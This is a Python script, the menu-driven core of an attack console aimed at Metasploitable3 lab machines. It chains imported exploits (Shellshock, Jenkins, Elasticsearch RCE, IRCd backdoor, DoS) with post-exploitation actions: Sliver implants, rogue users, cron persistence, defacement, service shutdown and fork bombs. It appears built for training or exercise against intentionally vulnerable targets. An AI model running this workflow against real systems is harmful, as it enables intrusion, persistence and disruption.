import yaml
import sys
from datetime import datetime
import argparse

# Custom
import utils

# Exploits
import exploits.nmap
import exploits.linux.mod_copy
import exploits.linux.ssh
import exploits.linux.shellshock
import exploits.linux.unreal_backdoor
import exploits.linux.actionpack_erb

import exploits.windows.jenkins_script
import exploits.windows.elasticsearch_rce
import exploits.windows.wamp_put
import exploits.windows.rdp
import exploits.windows.ftp_dos
import exploits.windows.http_sys_dos

# Actions
import actions.linux.deface_website
import actions.linux.disable_service
import actions.linux.pls
import actions.linux.temporary_sliver
import actions.linux.persistent_sliver
import actions.linux.rogue_users
import actions.linux.command
import actions.linux.root_command
import actions.linux.cronjob
import actions.linux.wall
import actions.linux.cowsay
import actions.linux.fork_bomb
import actions.linux.linpeas

import actions.windows.command
import actions.windows.notepad
import actions.windows.goose
import actions.windows.reboot
import actions.windows.stop_ftp
import actions.windows.stop_website
import actions.windows.system_sliver
import actions.windows.fork_bomb

parser = argparse.ArgumentParser(description="A script to attack Metasploitable3 machines.")
parser.add_argument('--config', type=str, help="Config file path", default='options.yaml')
parser.add_argument('--log', type=str, help="Log file path", default='')
args = parser.parse_args()

# Get list of target IPs from options.yaml file
with open(args.config, 'r') as f:
    try:
        conf = yaml.safe_load(f)
    except yaml.YAMLError as e:
        print('Error reading yaml file')
        print(e)
        sys.exit(1)

# Parse set of hosts and server IP from yaml config
linux_hosts = set(conf['linux'])
windows_hosts = set(conf['windows'])
server_ip = conf['server_ip']

# List of exploits
exploit_list = [
    utils.AttackItem('all', 'Exit', '', [], False, ''),
    utils.AttackItem('all', 'Select hosts', '', [], False, ''),

    exploits.linux.mod_copy.ModCopy(server_ip),
    exploits.linux.ssh.SSH(server_ip),
    exploits.linux.shellshock.ShellShock(server_ip),
    exploits.linux.unreal_backdoor.IRCdBackdoor(server_ip),
    exploits.linux.actionpack_erb.RubyActionPackInlineERB(server_ip),

    exploits.windows.ftp_dos.FTPDoS(server_ip),
    exploits.windows.http_sys_dos.HTTPSys(server_ip),
    # exploits.windows.eternalblue.EternalBlue(server_ip),
    exploits.windows.rdp.RDP(server_ip),
    exploits.windows.wamp_put.WAMPPUT(server_ip),
    exploits.windows.elasticsearch_rce.ESRCE(server_ip),
    exploits.windows.jenkins_script.JenkinsScript(server_ip),

    exploits.nmap.Nmap(server_ip)
]

# List of actions
action_list = [
    utils.AttackItem('all', 'None', '', [], False, ''),

    actions.linux.command.Command(server_ip),
    actions.linux.root_command.RootCommand(server_ip),
    actions.linux.pls.Pls(server_ip),
    actions.linux.persistent_sliver.PersistentSliver(server_ip),
    actions.linux.temporary_sliver.TemporarySliver(server_ip),
    actions.linux.rogue_users.RogueUsers(server_ip),
    actions.linux.cronjob.Cronjob(server_ip),
    actions.linux.deface_website.DefaceWebsite(server_ip),
    actions.linux.disable_service.DisableService(server_ip),
    actions.linux.wall.Wall(server_ip),
    actions.linux.cowsay.Cowsay(server_ip),
    actions.linux.fork_bomb.ForkBomb(server_ip),
    actions.linux.linpeas.Linpeas(server_ip),

    actions.windows.command.Command(server_ip),
    actions.windows.system_sliver.SystemSliver(server_ip),
    actions.windows.goose.Goose(server_ip),
    actions.windows.notepad.Notepad(server_ip),
    actions.windows.reboot.Reboot(server_ip),
    actions.windows.stop_ftp.StopFTP(server_ip),
    actions.windows.stop_website.StopWebsite(server_ip),
    actions.windows.fork_bomb.ForkBomb(server_ip),
]


if __name__ == '__main__':
    print('#'*40)
    print('     Metasploitable3 Attack Console     ')
    print('#'*40)

    if args.log:
        csv = utils.CSV(args.log, linux_hosts, windows_hosts)
    else:
        csv = utils.CSV(f'logs/{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv', linux_hosts, windows_hosts)

    hosts = utils.Hosts(linux_hosts, windows_hosts)

    # Main loop
    while True:
        print()

        # TODO: make webshells reusable by storing ip/path somewhere?
        # Print hosts
        print('Linux hosts:', ' '.join(hosts.range(hosts.selected_linux)))
        print('Windows hosts:', ' '.join(hosts.range(hosts.selected_windows)))
        print()
        
        # Choose exploit
        print('Choose an exploit to perform:')
        choice = utils.prompt(exploit_list)
        
        match choice.name:
            case 'Exit':
                sys.exit(0)
            case 'Select hosts':
                while r := hosts.prompt():
                    pass
                continue

        # Set targets
        match choice.os:
            case 'linux':
                targets = hosts.selected_linux
            case 'windows':
                targets = hosts.selected_windows
            case 'all':
                targets = hosts.selected_linux + hosts.selected_windows
        
        # Perform exploit
        print(f'Performing exploit: {choice.name} ({choice.os.title()})...')
        choice.set_targets(targets)
        shells = choice.execute()
        # Log results to CSV
        choice.log(csv, targets)
        shells = [shell for shell in shells if shell]

        print()
        while True:
            # If a valid shell exists
            if len(shells) > 0:
                # Print targets
                print('Targets with shells:', ' '.join(hosts.range([shell.target for shell in shells])))
                print()

                # Choose action(s)
                print('Choose an action to perform:')
                choice = utils.prompt(action_list, choice.os)
                
                if choice.name == 'None':
                    for shell in shells:
                        shell.kill()
                    break

                # Perform action
                print(f'Performing action: {choice.name}...')
                choice.set_targets(shells)
                results = choice.execute()
                # Log results to CSV
                choice.log(csv, [shell.target for shell in shells])

                # Discard failed shells
                shells = [shell for shell in results if shell]
            else:
                print('No shells.')
                break
